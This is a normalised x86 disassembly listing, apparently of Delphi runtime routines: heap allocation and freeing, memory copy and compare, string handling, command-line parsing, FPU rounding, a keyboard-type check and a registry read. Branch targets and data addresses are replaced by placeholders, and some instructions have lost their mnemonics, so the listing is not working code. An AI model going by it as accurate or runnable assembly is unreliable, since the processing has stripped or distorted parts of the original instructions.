cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d88
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c94
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401ec0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401ce0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d50
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c64
sub [ edi + 0x4 ] 0x4
sub_401f98
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017ec
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fc4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40187c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f0c
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401ff8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402024
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bd0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e38
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f98
test al al
jne r-xdata
mov eax esi
call sub_401ff8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a2c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402294
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401388
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402024
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401390
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b7c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b7c
jmp r-xdata
sub_4022a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40243a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401388
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401390
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403b7c
jmp r-xdata
call sub_401ec0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bd0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e38
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bd0
sub_40244c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ec0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bd0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fc4
test al al
je r-xdata
call sub_401bd0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c94
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e38
jmp r-xdata
sub_402628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026d9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a2c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40244c
test al al
je r-xdata
push rw-data
call sub_401388
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402118
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028e8
mov eax ebx
call sub_4022a8
retn
push rw-data
call sub_401390
sub_4026ec
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402848
sub_40270c
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402848
sub_40272c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402848
mov [ ecx ] eax
mov al 0x2
jmp sub_402848
retn
mov [ ecx ] eax
retn
sub_4027bc
push ebx
push esi
call sub_4061e8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_4061e8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_4061e8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027fc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_4061e8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027f0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402884
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028e8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402928
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_404764
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40123c
mov ebx eax
jmp r-xdata
push ebx
call sub_40123c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a14
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404118
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40128c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404208
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402928
mov edi eax
test esi esi
je r-xdata
sub_402a98
fld st0
sub esp 0x4
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
frndint
fwait
fldcw [ esp ]
add esp 0x4
fsubp st1
retn
sub_402ac8
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402b08
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402874
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b5c
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402874
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402874
jmp r-xdata
sub_402bb4
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402bf0
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_402c0c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c90
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402d00
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402d20
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402e00
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402e24
push ebx
push edi
mov edi eax
xor ebx ebx
mov bl cl
mov ecx ebx
xor eax eax
[ edi ]
sub edi ebx
inc eax
mov cl dl
rol al cl
shr ecx 0x3
cmp ecx ebx
jae r-xdata
pop edi
pop ebx
retn
or [ ecx + edi ] al
sub_402e70
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f23 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402f23 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402f23
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40315c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40318c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_4031fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012dc
retn
sub_403280
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403328
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403380
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404b68
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4033a0
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405ad0
cmp ecx 0xfe000000
